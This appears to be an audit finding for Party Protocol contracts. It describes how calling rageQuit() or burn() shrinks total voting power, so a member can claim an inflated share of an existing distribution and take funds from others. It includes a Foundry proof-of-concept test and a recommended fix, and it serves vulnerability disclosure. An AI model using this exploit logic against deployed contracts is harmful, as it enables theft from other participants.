@@ -1,0 +1,21 @@
+[H-01] The distribution logic will be broken after callingrageQuit()
+Submitted byhansfriese
+Malicious users might receive more distributed funds than they should with higherdistributionShare.
+Proof of Concept
+InPartyGovernanceNFT.sol, there is agetDistributionShareOf()function to calculate the distribution share of party NFT.
+functiongetDistributionShareOf(uint256tokenId)publicviewreturns(uint256) {uint256totalVotingPower=_governanceValues.totalVotingPower;if(totalVotingPower==0) {return0;}else{return(votingPowerByTokenId[tokenId] *1e18) /totalVotingPower;}}
+This function is used to calculate the claimable amount ingetClaimAmount().
+functiongetClaimAmount(ITokenDistributorPartyparty,uint256memberSupply,uint256partyTokenId)publicviewreturns(uint128) {// getDistributionShareOf() is the fraction of the memberSupply partyTokenId// is entitled to, scaled by 1e18.// We round up here to prevent dust amounts getting trapped in this contract.return((uint256(party.getDistributionShareOf(partyTokenId)) *memberSupply+ (1e18-1)) /1e18).safeCastUint256ToUint128();}
+So after the party distributed funds by executing the distribution proposal, users can claim relevant amounts of funds using their party NFTs.
+After the update,rageQuit()was added so that users can burn their party NFTs while taking their share of the party’s funds.
+So the below scenario would be possible.
+Let’s assumetotalVotingPower = 300and the party has 3 party NFTs of 100 voting power. AndAlicehas 2 NFTs andBobhas 1 NFT.They proposed a distribution proposal and executed it. Let’s assume the party transferred 3 ether to the distributor.They can claim the funds by callingTokenDistributor.claim()andAliceshould receive 2 ether and 1 ether forBob.(We ignore the distribution fee.)ButAlicedecided to stealBob’s funds so she claimed the distributed funds(3 / 3 = 1 ether) with the first NFT and calledrageQuit()to take her share of the party’s remaining funds.After that,Alicecallsclaim()with the second NFT, andgetDistributionShareOf()will return 50% as the total voting power was decreased to 200. SoAlicewill receive3 * 50% = 1.5 etherandBobwill receive only 0.5 ether because of thisvalidationAfter all,Alicereceived 2.5 ether instead of 2 ether.
+Even ifrageQuitis disabled,Alicecan burn, usingburn(), her NFT directly if her share of the party’s remaining funds are less than the stolen funds fromBob.
+Here is a simple POC showing the distribution shares afterrageQuit().
+functiontestWrongDistributionSharesAfterRageQuit()external{(Partyparty, , ) =partyAdmin.createParty(partyImpl,PartyAdmin.PartyCreationMinimalOptions({host1:address(this),host2:address(0),passThresholdBps:5100,totalVotingPower:300,preciousTokenAddress:address(toadz),preciousTokenId:1,rageQuitTimestamp:0,feeBps:0,feeRecipient:payable(0)}));vm.prank(address(this));party.setRageQuit(uint40(block.timestamp) +1);addressuser1=_randomAddress();addressuser2=_randomAddress();addressuser3=_randomAddress();//3 users have the same voting powervm.prank(address(partyAdmin));uint256tokenId1=party.mint(user1,100,user1);vm.prank(address(partyAdmin));uint256tokenId2=party.mint(user2,100,user2);vm.prank(address(partyAdmin));uint256tokenId3=party.mint(user3,100,user3);vm.deal(address(party),1ether);// Before calling rageQuit(), each user has the same 33.3333% sharesuint256expectedShareBeforeRageQuit=uint256(100) *1e18/300;assertEq(party.getDistributionShareOf(tokenId1),expectedShareBeforeRageQuit);assertEq(party.getDistributionShareOf(tokenId2),expectedShareBeforeRageQuit);assertEq(party.getDistributionShareOf(tokenId3),expectedShareBeforeRageQuit);IERC20[]memorytokens=newIERC20[](1);tokens[0] =IERC20(ETH_ADDRESS);uint256[]memorytokenIds=newuint256[](1);tokenIds[0] =tokenId1;vm.prank(user1);party.rageQuit(tokenIds,tokens,user1);// After calling rageQuit() by one user, the second user has 50% shares and can claim more distributionuint256expectedShareAfterRageQuit=uint256(100) *1e18/200;assertEq(party.getDistributionShareOf(tokenId2),expectedShareAfterRageQuit);}
+Recommended Mitigation Steps
+I think we shouldn’t usegetDistributionShareOf()for distribution shares.
+Instead, we should remembertotalVotingPowerfor each distribution separately in_createDistribution()so that each user can receive correct funds even after some NFTs are burnt.
+Assessed type
+Governance
+0xble (Party) confirmed
